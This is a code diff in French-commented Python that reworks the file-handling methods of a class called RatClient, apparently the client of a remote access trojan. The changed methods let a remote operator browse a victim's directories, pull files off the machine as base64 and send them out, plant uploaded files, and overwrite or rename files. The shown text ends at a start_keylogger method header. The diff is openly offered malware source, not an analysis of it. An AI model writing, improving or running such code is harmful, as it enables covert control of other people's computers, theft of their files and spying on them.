@@ -408,106 +408,156 @@ class RatClient:
         except Exception as e:
             print(f"Erreur lors du démarrage du processus : {e}")
 
-    def list_directory(self, path):
+    def list_directory(self, path=None):
         """Liste le contenu d'un répertoire."""
         try:
-            # Si le chemin est vide ou None, utiliser le chemin actuel
-            if not path:
-                path = self.current_path
+            # Si aucun chemin n'est spécifié, utiliser le chemin courant
+            if path is None or path == "..":
+                # Remonter d'un niveau si on demande le dossier parent
+                path = os.path.dirname(self.current_path)
+                print(f"[DEBUG] Remontée vers le dossier parent: {path}")
             
-            print(f"[DEBUG] Tentative de listage du répertoire: {path}")
+            print(f"[DEBUG] Tentative de listage du dossier: {path}")
             
-            # Pour Windows, s'assurer que le chemin est valide
-            if self.os_type == 'Windows':
-                # Si le chemin commence par C:\home\slayz, le corriger
-                if path.startswith('C:\\home\\slayz'):
-                    path = f"C:\\Users\\{self.username}"
-                # Convertir les slashes en backslashes
-                path = path.replace('/', '\\')
-                # S'assurer que c'est un chemin absolu
-                if not os.path.isabs(path):
-                    path = os.path.join(f"C:\\Users\\{self.username}", path)
-            
-            # Convertir en chemin absolu
-            path = os.path.abspath(path)
-            print(f"[DEBUG] Chemin absolu final: {path}")
-            
-            # Vérifier si le chemin existe
-            if not os.path.exists(path):
-                print(f"[DEBUG] Le chemin {path} n'existe pas")
+            try:
+                # Normaliser le chemin selon l'OS et gérer les espaces
+                path = os.path.normpath(path)
+                # Convertir en chemin absolu
+                path = os.path.abspath(path)
+                
+                # Vérifier que le chemin n'est pas vide
+                if not path:
+                    path = os.path.abspath(os.path.sep)
+                
+                print(f"[DEBUG] Chemin normalisé: {path}")
+                
+                # Vérifier si le chemin existe et est accessible
+                if not os.path.exists(path):
+                    raise FileNotFoundError(f"Le chemin {path} n'existe pas")
+                
+                # Vérifier si c'est un dossier
+                if not os.path.isdir(path):
+                    raise NotADirectoryError(f"{path} n'est pas un dossier")
+                
+                # Vérifier les permissions de lecture
+                if not os.access(path, os.R_OK):
+                    raise PermissionError(f"Pas de permission de lecture pour {path}")
+                
+                print(f"[DEBUG] Vérifications de base passées pour: {path}")
+                
+                # Mettre à jour le chemin courant seulement si on peut y accéder
+                self.current_path = path
+                
+                entries = []
+                # Ajouter l'entrée pour remonter d'un niveau si on n'est pas à la racine
+                if path != os.path.abspath(os.path.sep):
+                    entries.append({
+                        'name': '..',
+                        'type': 'Directory',
+                        'size': '--',
+                        'modified': '',
+                        'path': os.path.dirname(path)
+                    })
+                
+                # Lister les fichiers et dossiers
+                try:
+                    items = os.listdir(path)
+                    print(f"[DEBUG] {len(items)} éléments trouvés dans {path}")
+                    
+                    for item in items:
+                        try:
+                            if item in ['.', '..']:  # Ignorer . et ..
+                                continue
+                                
+                            full_path = os.path.join(path, item)
+                            
+                            # Vérifier si on peut accéder au fichier/dossier
+                            if not os.access(full_path, os.R_OK):
+                                print(f"[DEBUG] Pas de permission de lecture pour {full_path}")
+                                continue
+                            
+                            stat_info = os.stat(full_path)
+                            
+                            # Déterminer le type
+                            item_type = "Directory" if os.path.isdir(full_path) else "File"
+                            
+                            # Formater la taille
+                            size = stat_info.st_size
+                            if item_type == "Directory":
+                                size_str = "--"
+                            elif size < 1024:
+                                size_str = f"{size} B"
+                            elif size < 1024*1024:
+                                size_str = f"{size/1024:.1f} KB"
+                            else:
+                                size_str = f"{size/(1024*1024):.1f} MB"
+                            
+                            # Formater la date de modification
+                            mod_time = datetime.fromtimestamp(stat_info.st_mtime)
+                            mod_str = mod_time.strftime('%Y-%m-%d %H:%M:%S')
+                            
+                            entry = {
+                                'name': item,
+                                'type': item_type,
+                                'size': size_str,
+                                'modified': mod_str,
+                                'path': full_path
+                            }
+                            entries.append(entry)
+                            
+                        except (OSError, PermissionError) as e:
+                            print(f"[DEBUG] Erreur lors de l'accès à {item}: {e}")
+                            continue
+                        except Exception as e:
+                            print(f"[DEBUG] Erreur inattendue pour {item}: {e}")
+                            continue
+                    
+                    # Trier : dossiers d'abord, puis fichiers, par ordre alphabétique
+                    entries.sort(key=lambda x: (x['name'] != '..', x['type'] != 'Directory', x['name'].lower()))
+                    
+                    print(f"[DEBUG] Envoi de la liste des fichiers ({len(entries)} éléments)")
+                    
+                    # Envoyer la réponse
+                    self.send_message({
+                        'type': 'command_response',
+                        'command': 'list_directory',
+                        'data': {
+                            'entries': entries,
+                            'current_path': path,
+                            'error': None
+                        }
+                    })
+                    print(f"[DEBUG] Liste des fichiers envoyée avec succès pour {path}")
+                    
+                except Exception as e:
+                    print(f"[ERROR] Erreur lors du listage du dossier {path}: {e}")
+                    raise
+                
+            except PermissionError as e:
+                print(f"[ERROR] Erreur de permission lors du listage du dossier {path}: {e}")
                 self.send_message({
                     'type': 'command_response',
                     'command': 'list_directory',
                     'data': {
-                        'error': f"Le chemin {path} n'existe pas",
+                        'error': f"Erreur de permission: {str(e)}",
                         'current_path': self.current_path,
                         'entries': []
                     }
                 })
-                return
-            
-            # Mettre à jour le chemin actuel si le nouveau chemin est valide
-            self.current_path = path
-            print(f"[DEBUG] Chemin actuel mis à jour: {self.current_path}")
-            
-            entries = []
-            try:
-                # Lister les fichiers et dossiers
-                for item in os.listdir(path):
-                    try:
-                        full_path = os.path.join(path, item)
-                        stat_info = os.stat(full_path)
-                        
-                        # Déterminer le type
-                        if os.path.isdir(full_path):
-                            item_type = "Directory"
-                        else:
-                            item_type = "File"
-                        
-                        # Formater la taille
-                        size = stat_info.st_size
-                        if size < 1024:
-                            size_str = f"{size} B"
-                        elif size < 1024*1024:
-                            size_str = f"{size/1024:.1f} KB"
-                        else:
-                            size_str = f"{size/(1024*1024):.1f} MB"
-                        
-                        entry = {
-                            'name': item,
-                            'type': item_type,
-                            'size': size_str,
-                            'modified': datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
-                            'path': full_path
-                        }
-                        entries.append(entry)
-                        print(f"[DEBUG] Ajouté: {item} ({item_type})")
-                    except Exception as e:
-                        print(f"[DEBUG] Erreur pour {item}: {str(e)}")
-                        continue
             except Exception as e:
-                print(f"[DEBUG] Erreur lors du listage: {str(e)}")
-            
-            # Trier les entrées (dossiers d'abord, puis par nom)
-            entries.sort(key=lambda x: (x['type'] != 'Directory', x['name'].lower()))
-            
-            print(f"[DEBUG] Nombre total d'entrées: {len(entries)}")
-            
-            # Envoyer la réponse avec les entrées dans un dictionnaire
-            response = {
-                'type': 'command_response',
-                'command': 'list_directory',
-                'data': {
-                    'entries': entries,
-                    'current_path': path
-                }
-            }
-            print(f"[DEBUG] Envoi de la réponse avec {len(entries)} entrées")
-            print(f"[DEBUG] Format de la réponse: {response}")
-            self.send_message(response)
+                print(f"[ERROR] Erreur lors du listage du dossier {path}: {e}")
+                self.send_message({
+                    'type': 'command_response',
+                    'command': 'list_directory',
+                    'data': {
+                        'error': str(e),
+                        'current_path': self.current_path,
+                        'entries': []
+                    }
+                })
             
         except Exception as e:
-            print(f"[DEBUG] Erreur globale: {str(e)}")
+            print(f"[ERROR] Erreur globale dans list_directory pour {path}: {e}")
             self.send_message({
                 'type': 'command_response',
                 'command': 'list_directory',
@@ -521,95 +571,287 @@ class RatClient:
     def create_directory(self, path):
         """Crée un nouveau répertoire."""
         try:
+            # Normaliser le chemin
+            path = os.path.normpath(path)
+            
+            # Vérifier si le dossier existe déjà
+            if os.path.exists(path):
+                raise FileExistsError(f"Le dossier {path} existe déjà")
+            
+            # Créer le dossier
             os.makedirs(path)
+            
+            # Envoyer la confirmation
+            self.send_message({
+                'type': 'command_response',
+                'command': 'create_directory',
+                'data': {
+                    'status': 'success',
+                    'path': path
+                }
+            })
+            
+            # Rafraîchir la liste des fichiers
+            self.list_directory(os.path.dirname(path))
+            
         except Exception as e:
-            print(f"Erreur lors de la création du répertoire : {e}")
+            print(f"Erreur lors de la création du dossier: {e}")
+            self.send_message({
+                'type': 'command_response',
+                'command': 'create_directory',
+                'data': {
+                    'status': 'error',
+                    'message': str(e)
+                }
+            })
 
     def upload_file(self, path, file_name, data):
         """Upload un fichier."""
         try:
-            # Assurer que le chemin est correct pour le système d'exploitation
+            # Normaliser le chemin
+            path = os.path.normpath(path)
+            
+            # Vérifier si le dossier de destination existe
+            if not os.path.exists(path):
+                raise FileNotFoundError(f"Le dossier de destination {path} n'existe pas")
+            
+            # Construire le chemin complet du fichier
             file_path = os.path.join(path, file_name)
-            with open(file_path, 'wb') as f:
-                f.write(base64.b64decode(data))
-            self.send_message({
-                'type': 'command_response',
-                'command': 'file_uploaded',
-                'data': {'file_name': file_name}
-            })
+            
+            # Décoder et écrire le fichier
+            try:
+                file_data = base64.b64decode(data)
+                with open(file_path, 'wb') as f:
+                    f.write(file_data)
+                
+                # Envoyer la confirmation
+                self.send_message({
+                    'type': 'command_response',
+                    'command': 'file_uploaded',
+                    'data': {
+                        'status': 'success',
+                        'file_name': file_name,
+                        'path': file_path
+                    }
+                })
+                
+                # Rafraîchir la liste des fichiers
+                self.list_directory(path)
+                
+            except Exception as e:
+                raise Exception(f"Erreur lors de l'écriture du fichier: {e}")
+            
         except Exception as e:
-            print(f"Erreur lors de l'upload du fichier : {e}")
+            print(f"Erreur lors de l'upload du fichier: {e}")
             self.send_message({
                 'type': 'command_response',
                 'command': 'file_uploaded',
-                'data': {'file_name': file_name, 'status': 'error', 'message': str(e)}
+                'data': {
+                    'status': 'error',
+                    'file_name': file_name,
+                    'message': str(e)
+                }
             })
 
     def download_file(self, path):
         """Télécharge un fichier."""
         try:
-            with open(path, 'rb') as f:
-                data = f.read()
-                self.send_message({
-                    'type': 'file_data',
-                    'data': base64.b64encode(data).decode()
-                })
+            # Normaliser le chemin
+            path = os.path.normpath(path)
+            
+            # Vérifier si le fichier existe
+            if not os.path.exists(path):
+                raise FileNotFoundError(f"Le fichier {path} n'existe pas")
+            
+            # Vérifier si c'est bien un fichier
+            if not os.path.isfile(path):
+                raise IsADirectoryError(f"{path} est un dossier, pas un fichier")
+            
+            # Vérifier les permissions de lecture
+            if not os.access(path, os.R_OK):
+                raise PermissionError(f"Pas de permission de lecture pour {path}")
+            
+            # Vérifier la taille du fichier
+            file_size = os.path.getsize(path)
+            if file_size == 0:
+                raise ValueError(f"Le fichier {path} est vide")
+            
+            # Lire et encoder le fichier
+            try:
+                with open(path, 'rb') as f:
+                    file_data = f.read()
+                    encoded_data = base64.b64encode(file_data).decode('utf-8')
+                    
+                    print(f"[DEBUG] Envoi du fichier {path} ({file_size} bytes)")
+                    
+                    # Envoyer la réponse avec le type de commande correct
+                    self.send_message({
+                        'type': 'command_response',
+                        'command': 'download_file',
+                        'data': {
+                            'status': 'success',
+                            'content': encoded_data,
+                            'file_name': os.path.basename(path),
+                            'file_size': file_size,
+                            'path': path
+                        }
+                    })
+                    print(f"[DEBUG] Fichier envoyé avec succès")
+                    
+            except Exception as e:
+                print(f"[ERROR] Erreur lors de la lecture du fichier: {e}")
+                raise Exception(f"Erreur lors de la lecture du fichier: {e}")
+            
         except Exception as e:
-            print(f"Erreur lors du téléchargement du fichier : {e}")
+            error_msg = str(e)
+            print(f"[ERROR] Erreur lors du téléchargement du fichier: {error_msg}")
+            self.send_message({
+                'type': 'command_response',
+                'command': 'download_file',
+                'data': {
+                    'status': 'error',
+                    'message': error_msg,
+                    'path': path
+                }
+            })
 
     def read_file(self, path):
         """Lit le contenu d'un fichier."""
         try:
-            with open(path, 'rb') as f:
-                content = f.read()
-                encoded_content = base64.b64encode(content).decode('utf-8')
-                self.send_message({
-                    'type': 'command_response',
-                    'command': 'read_file',
-                    'data': encoded_content
-                })
+            # Normaliser le chemin
+            path = os.path.normpath(path)
+            
+            # Vérifier si le fichier existe
+            if not os.path.exists(path):
+                raise FileNotFoundError(f"Le fichier {path} n'existe pas")
+            
+            # Vérifier si c'est bien un fichier
+            if not os.path.isfile(path):
+                raise IsADirectoryError(f"{path} est un dossier, pas un fichier")
+            
+            # Lire et encoder le fichier
+            try:
+                with open(path, 'rb') as f:
+                    file_data = f.read()
+                    
+                    # Détecter si c'est un fichier texte
+                    try:
+                        # Essayer de décoder en UTF-8
+                        content = file_data.decode('utf-8')
+                        is_text = True
+                    except UnicodeDecodeError:
+                        # Si échec, considérer comme fichier binaire
+                        is_text = False
+                        content = base64.b64encode(file_data).decode('utf-8')
+                    
+                    self.send_message({
+                        'type': 'command_response',
+                        'command': 'read_file',
+                        'data': {
+                            'status': 'success',
+                            'content': content,
+                            'is_text': is_text
+                        }
+                    })
+                    
+            except Exception as e:
+                raise Exception(f"Erreur lors de la lecture du fichier: {e}")
+            
         except Exception as e:
-            print(f"Erreur lors de la lecture du fichier {path}: {e}")
+            print(f"Erreur lors de la lecture du fichier: {e}")
             self.send_message({
                 'type': 'command_response',
                 'command': 'read_file',
-                'data': ''
+                'data': {
+                    'status': 'error',
+                    'message': str(e)
+                }
             })
 
     def write_file(self, path, content):
         """Écrit le contenu dans un fichier."""
         try:
-            with open(path, 'wb') as f:
-                decoded_content = base64.b64decode(content)
-                f.write(decoded_content)
-            self.send_message({
-                'type': 'command_response',
-                'command': 'write_file',
-                'data': {'status': 'success'}
-            })
+            # Normaliser le chemin
+            path = os.path.normpath(path)
+            
+            # Vérifier si le dossier parent existe
+            parent_dir = os.path.dirname(path)
+            if not os.path.exists(parent_dir):
+                raise FileNotFoundError(f"Le dossier parent {parent_dir} n'existe pas")
+            
+            # Écrire le fichier
+            try:
+                with open(path, 'wb') as f:
+                    # Décoder le contenu
+                    file_data = base64.b64decode(content)
+                    f.write(file_data)
+                
+                self.send_message({
+                    'type': 'command_response',
+                    'command': 'write_file',
+                    'data': {
+                        'status': 'success',
+                        'path': path
+                    }
+                })
+                
+                # Rafraîchir la liste des fichiers
+                self.list_directory(os.path.dirname(path))
+                
+            except Exception as e:
+                raise Exception(f"Erreur lors de l'écriture du fichier: {e}")
+            
         except Exception as e:
-            print(f"Erreur lors de l'écriture du fichier {path}: {e}")
+            print(f"Erreur lors de l'écriture du fichier: {e}")
             self.send_message({
                 'type': 'command_response',
                 'command': 'write_file',
-                'data': {'status': 'error', 'message': str(e)}
+                'data': {
+                    'status': 'error',
+                    'message': str(e)
+                }
             })
 
     def rename_file(self, old_path, new_path):
-        """Renomme un fichier ou un dossier."""
+        """Renomme un fichier ou dossier."""
         try:
+            # Normaliser les chemins
+            old_path = os.path.normpath(old_path)
+            new_path = os.path.normpath(new_path)
+            
+            # Vérifier si la source existe
+            if not os.path.exists(old_path):
+                raise FileNotFoundError(f"Le fichier/dossier source {old_path} n'existe pas")
+            
+            # Vérifier si la destination n'existe pas déjà
+            if os.path.exists(new_path):
+                raise FileExistsError(f"Le fichier/dossier destination {new_path} existe déjà")
+            
+            # Renommer
             os.rename(old_path, new_path)
+            
             self.send_message({
                 'type': 'command_response',
                 'command': 'rename_file',
-                'data': {'status': 'success'}
+                'data': {
+                    'status': 'success',
+                    'old_path': old_path,
+                    'new_path': new_path
+                }
             })
+            
+            # Rafraîchir la liste des fichiers
+            self.list_directory(os.path.dirname(new_path))
+            
         except Exception as e:
-            print(f"Erreur lors du renommage de {old_path} vers {new_path}: {e}")
+            print(f"Erreur lors du renommage: {e}")
             self.send_message({
                 'type': 'command_response',
                 'command': 'rename_file',
-                'data': {'status': 'error', 'message': str(e)}
+                'data': {
+                    'status': 'error',
+                    'message': str(e)
+                }
             })
 
     def start_keylogger(self):
